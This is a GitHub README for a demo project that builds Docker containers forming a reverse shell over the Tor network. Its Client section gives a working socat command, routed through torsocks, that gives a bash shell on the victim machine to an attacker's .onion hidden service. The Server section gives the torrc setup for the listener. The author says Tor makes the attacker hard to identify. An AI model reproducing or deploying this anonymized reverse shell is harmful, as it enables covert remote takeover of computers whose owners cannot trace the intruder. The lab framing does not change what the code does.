<div align="center">
<img src="https://img.shields.io/badge/docker-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white" alt="docker" />

<img src="https://img.shields.io/badge/tor-%237E4798.svg?style=for-the-badge&logo=tor-project&logoColor=white" alt="tor-web-server"/>

<img src="https://img.shields.io/badge/Ubuntu-E95420?style=for-the-badge&logo=ubuntu&logoColor=white" alt="ubuntu-linux"/>

<img src="" alt=""/>

</div>
<br/>
<br/>

## **💁 What is Shell ?**

We can define a shell as a link between the system and the user. We can say that the shell has the purpose of interpreting commands, transmitting the results to the system and returning the results. Various types of shell interpreters on Unix/Linux systems, the most common being sh , bash , csh , Tcsh , ksh , and zsh.

## **🤔 What is reverse shell ?**

It is a technique used to send commands from a shell remotely through a port and thus allows the attacker to open a listening port on your server to receive connections from other machines, thus allowing control over them.

<p align="center">
<img src="./assets/rshell-example.png" alt="reverse-shell" />
</p>

With access to a compromised machine, the attacker will be able to escalate privileges to gain administrative access to the system.

## **💻 Project**

We created **_two containers_** in isolation that communicate with the **_Tor network_** forming a **_reverse shell_**. In this way, an attacker listens for connections from the Tor network while the victim's computer connects to the attacker.

<p align="center">
<img src="./assets/architecture.png" alt="architecture" width="700px"/>
</p>

To create the docker images we used [Ubuntu](https://ubuntu.com/) and installed [socat](https://linux.die.net/man/1/socat) and [tor](https://community.torproject.org/relay/setup/bridge/debian-ubuntu/) via apt-get as you can see in the dockerfiles.

## **🚀 Get Started**

First open a terminal instance and run the **_start_listen.sh_** script:

<p align="center">
<img src="./assets/listen-example.gif" alt="example-1"/>
</p>

Wait for Tor startup to reach 100%. Copy the script in yellow like the one generated in the image above.

Now open another instance of the terminal and run the **_start_rshell.sh_** script. After initialization, paste the script that was copied in the terminal and hit the enter key:

<p align="center">
<img src="./assets/rshell-example.gif" alt="example-2"/>
</p>

You can see that the attacker gets access to the victim computer.

## **📞 Client**

In order for the client to be able to make calls to the attacker, the rshell container needs to be on the tor network and execute the following command:

```bash
# example attacker host
ATTACKER_HOST=lsgbhtjko6zcrgsyb2nzdx76rpyaycvivl5tnmwyq336hlbqxjremcid.onion
ATTACKER_PORT=80

torsocks socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ATTACKER_HOST:$ATTACKER_PORT
```

The **_torsocks_** command guarantees the the victim's ability to making calls to hosts on the Tor network.

## **🌐 Server**

To create the server on the Tor network we must include the file **_torrc_** in the directory **_/etc/tor/_** this way we will get a host on the Tor network.

```bash
# torrc example
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:80
```

After starting the **_listen_** container you can see the host created by running the command:

```bash
docker exec -it listen cat /var/lib/tor/hidden_service/hostname

# out example
lsgbhtjko6zcrgsyb2nzdx76rpyaycvivl5tnmwyq336hlbqxjremcid.onion
```

Every call the victim makes to host `lsgbhtjko6zcrgsyb2nzdx76rpyaycvivl5tnmwyq336hlbqxjremcid.onion` will be redirected to the **_socat_** server which is listening locally on port 80.

## **💥 Considerations**

There are many ways to create a reverse shell as you can see [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). We use socat because it's easy to create a reverse shell with interactive PTY and autocomplete. I'm not a racker and I'm far from it. But some lamers out there make gigantic python scripts with interactive interfaces and lots of base 64 to do it. For a good lamer a sh terminal with busybox is enough. Using the Tor network to create a reverse shell makes it very difficult to identify the attacker. I could have used the **_alpine_** image instead of **_ubuntu_** to create the containers but there was a problem in socat and I was too lazy to do that.

## **📚 References**

- [Van Houser](https://github.com/vanhauser-thc?tab=repositories)
- [Hackers-cheats](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

## **👨‍🚀 Author**

<a href="https://github.com/tpaphysics">
<img alt="Thiago Pacheco" src="https://images.weserv.nl/?url=avatars.githubusercontent.com/u/46402647?v=4?v=4&h=300&w=300&fit=cover&mask=circle&maxage=7d" width="100px"/>
  <br />
  <sub>
    <b>Thiago Pacheco de Andrade</b>
  </sub>
</a>
<br />

👋 My contacts!

[![Linkedin Badge](https://img.shields.io/badge/-LinkedIn-blue?style=for-the-badge&logo=Linkedin&logoColor=white&link=https://www.linkedin.com/in/thiago-pacheco-200a1a86/)](https://www.linkedin.com/in/thiago-pacheco-200a1a86/)
[![Gmail Badge](https://img.shields.io/badge/-Gmail-c14438?style=for-the-badge&logo=Gmail&logoColor=white&link=mailto:physics.posgrad.@gmail.com)](mailto:physics.posgrad.@gmail.com)

## **📝 License**

This project has an MIT [license](LICENSE.md).
